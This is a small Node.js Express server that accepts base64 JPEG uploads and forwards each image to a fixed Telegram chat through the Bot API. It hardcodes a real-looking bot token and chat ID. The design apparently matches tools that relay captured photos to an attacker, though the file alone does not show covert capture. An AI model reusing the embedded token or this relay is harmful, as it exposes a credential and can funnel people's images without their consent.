const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3001;

app.use(bodyParser.json({ limit: '10mb' }));

app.post('/upload', async (req, res) => {
  const { image } = req.body;
  const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
  const filePath = 'temp.jpg';
  fs.writeFileSync(filePath, base64Data, 'base64');

  try {
    const telegramToken = '7347455111:AAFUtpPog7Fd5M9voBK-7PrWxqMZnT5atWQ';
    const chatId = '1946463685';
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', fs.createReadStream(filePath));

    await axios.post(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, formData, {
      headers: formData.getHeaders()
    });

    fs.unlinkSync(filePath);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});